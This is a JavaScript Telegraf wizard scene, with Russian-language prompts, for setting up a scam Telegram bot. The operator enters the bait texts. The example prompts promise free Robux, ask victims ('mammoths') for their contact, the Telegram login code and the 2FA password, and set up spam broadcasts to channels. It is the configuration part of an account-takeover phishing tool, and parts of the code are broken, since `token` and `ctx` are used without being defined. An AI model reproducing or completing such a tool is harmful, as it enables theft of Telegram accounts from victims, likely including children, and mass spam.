const { Scenes: { WizardScene }, Telegraf } = require("telegraf");
const { ref, get, child, set, update } = require("firebase/database");

const db = require("../database");

const createBotScene = new WizardScene("createBotScene",
    async (ctx) => {
        ctx.state = {}

        if(ctx.message?.text == undefined) return;
        ctx.state.botToken = token;

        await ctx.reply("Вы попали в настройку текста бота!\nВведите текст кнопки отправки контакта.\n\nПример: \"Получить робуксы\"");
        return ctx.wizard.next();
    },

    async () => {
        ctx.state.textInfo = {};

        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.authorizationButtonText = ctx.message.text;

        await ctx.reply("Текст кнопки успешно задан!\nВведите текст при /start.\n\nПример: \"Хочешь получить робуксы бесплатно? Нажимай на кнопку ниже!\"");
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.startText = ctx.message.text;

        await ctx.reply("Текст команды успешно задан!\nВведите текст подключения\n\nПример: \"Подключаемся к серверам роблокса..\"");
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.connectionText = ctx.message.text;

        await ctx.reply("Текст подключения успешно задан!\nВведите текст ввода кода\n\nПример: \"Введите код, который вам пришёл от телеграмма(проверьте чаты)\"");
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.codeText = ctx.message.text;

        await ctx.reply("Текст ввода кода успешно задан!\nВведите текст при вводе неверного кода\n\nПример: \"Вы ввели неверный код! Проверьте чаты.\"");
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.invalidCodeErrorText = ctx.message.text;

        await ctx.reply("Текст ввода неверного кода успешно задан!\nВведите текст при вводе верного кода\n\nПример: \"Роблоксы будут выданы через 24 часа. Введите ваш ник в игре\"");
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.validCodeText = ctx.message.text;

        await ctx.reply("Текст ввода верного кода успешно задан!\nВведите текст при неудаче отправки кода(рейтлимиты аккаунта мамонта)\n\nПример: \"На ваш аккаунт нельзя получить робуксы!\"");
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.errorSendCodeText = ctx.message.text;

        await ctx.reply("Текст ввода при неудаче отправки кода(рейтлимиты аккаунта мамонта) задан!\nВведите текст при установленном 2фа\n\nПример: \"Введите ваш пароль 2фа: \"");
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.passwordNeedErrorText = ctx.message.text;

        await ctx.reply("Текст ввода при установленном 2фа задан!\nВведите текст при неверном введёном 2фа\n\nПример: \"Пароль введён неверно! Попробуйте ещё раз\"");
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.textInfo.invalidPasswordError = ctx.message.text;

        await ctx.reply("Текст ввода при неверном вводе 2фа задан!\n\nНачалась настройка рассылки!\nВведите текст рассылки\nПример: \"Хочешь получить бесплатные робуксы? Пиши этому боту @test\"")
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.spamInfo = {}
        ctx.state.spamInfo.spamText = ctx.message.text;

        await ctx.reply("Текст ввода при спаме задан!\nВведите ссылки на каналы для вступления через \",\"\nПример: \"https://t.me/RobloxXO,https://t.me/RobloxXO\"")
        return ctx.wizard.next();
    },

    async () => {
        if(ctx.message?.text == undefined) return;

        ctx.state.spamInfo.joinChannels = ctx.message.text.split(",");

        await ctx.reply("Текст ввода при каналы для вступления заданы!\nВведите айдишники каналов для спама, получить айдишники можно тут @getmy_idbot\nПример: \"-1001612518469,-1001612518469\"")
        return ctx.wizard.next();
    }
)
createBotScene.enter((ctx) => {
    ctx.reply("Вы попали в создание бота!\n\nВведите токен бота: ")
})

module.exports = createBotScene;